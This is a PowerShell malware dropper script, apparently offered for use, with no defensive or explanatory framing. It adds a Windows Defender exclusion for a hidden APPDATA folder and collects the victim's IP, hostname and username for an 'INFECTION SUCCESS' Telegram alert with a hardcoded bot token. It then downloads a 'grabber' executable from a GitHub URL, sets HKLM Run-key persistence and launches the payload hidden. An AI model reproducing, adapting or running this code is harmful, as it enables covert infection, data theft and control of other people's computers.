# Paths & URLs
$baseDir = "$env:APPDATA\Microsoft\Windows\Templates"
$grabberUrl = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 1. Hide & Exclude from Defender
if (!(Test-Path $baseDir)) { New-Item -Path $baseDir -Force -ItemType Directory }
powershell -Command "Add-MpPreference -ExclusionPath '$baseDir'"

# --- FIXED SUCCESS NOTIFICATION ---
try {
    # Get Public IP reliably
    $ip = (Invoke-WebRequest -uri "http://ifconfig.me").Content.Trim()
    $hostName = $env:COMPUTERNAME
    $user = $env:USERNAME
    
    $token = "7978003950:AAEaommu0ospO2aDUL0fuYQA7XfgQMXR_Os"
    $chatId = "8051121194"
    
    # Construct the proper API URL
    $msg = "✅ **INFECTION SUCCESS**%0A💻 **Host**: $hostName%0A👤 **User**: $user%0A📍 **IP**: $ip%0A🚀 **Status**: Dropper Executing..."
    $url = "https://telegram.org"
    
    # Send the hit to your Telegram Bot
    Invoke-RestMethod -Uri $url -Method Post
} catch {
    # Silent fail to keep a low profile if offline
}

# 2. Download Payloads
$wc = New-Object Net.WebClient
$wc.DownloadFile($grabberUrl, "$baseDir\sys_sync.exe")

# 3. Persistence (HKLM Run Key)
$runPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$wmi.CreateKey($HKLM, $runPath)
$wmi.SetStringValue($HKLM, $runPath, "SystemSync", "$baseDir\sys_sync.exe")

# 4. Fire and Forget
Start-Process "$baseDir\sys_sync.exe" -WindowStyle Hidden

